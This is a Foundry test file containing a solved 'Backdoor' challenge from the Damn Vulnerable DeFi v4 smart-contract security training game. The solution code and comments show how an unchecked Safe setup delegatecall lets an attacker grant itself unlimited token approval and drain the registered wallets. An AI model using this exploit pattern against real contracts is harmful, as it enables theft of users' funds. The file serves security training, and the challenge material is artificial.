// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract ApprovalHelper {
    function approve(address token, address spender, uint256 amount) external {
        ERC20(token).approve(spender, amount);
    }
}

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [
        makeAddr("alice"),
        makeAddr("bob"),
        makeAddr("charlie"),
        makeAddr("david")
    ];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(singletonCopy),
            address(walletFactory),
            address(token),
            users
        );

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(
            token.balanceOf(address(walletRegistry)),
            AMOUNT_TOKENS_DISTRIBUTED
        );
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(bytes4(hex"82b42900")); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */

    // WalletRegistry.proxyCreated does not check the initializer data, it just checks the selector
    // the initializer data is the calldata for the Safe.setup function
    // we have two parameters there address to, bytes calldata data which are unchecked by WalletRegistry
    // these parameters passed to execute function and that means we can call any contract and its function
    // we can use this to call the approve function of the token contract since it is a delegate call
    // so SafeProxy wallet is calling our ApprovalHelper contract and then ApprovalHelper contract is calling the approve function of the token contract

    function test_backdoor() public checkSolvedByPlayer {
        // ### Step 1: Deploy Helper Contract

        ApprovalHelper helper = new ApprovalHelper();

        // ### Step 2: Create Malicious Setup Data

        bytes memory maliciousApprovalData = abi.encodeWithSelector(
            helper.approve.selector,
            address(token),
            address(player),
            type(uint256).max
        );

        address[] memory owners = new address[](1);

        for (uint256 i = 0; i < users.length; i++) {
            owners[0] = users[i];

            bytes memory initData = abi.encodeWithSelector(
                Safe.setup.selector,
                owners,
                1,
                address(helper),
                maliciousApprovalData,
                address(0)
            );

            // ### Step 3: Create Backdoored Wallets

            SafeProxy safeProxy = walletFactory.createProxyWithCallback(
                address(singletonCopy),
                initData,
                123,
                walletRegistry
            );

            // ### Step 4: Drain Each Wallet

            token.transferFrom(
                address(safeProxy),
                address(recovery),
                token.balanceOf(address(safeProxy))
            );
        }
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
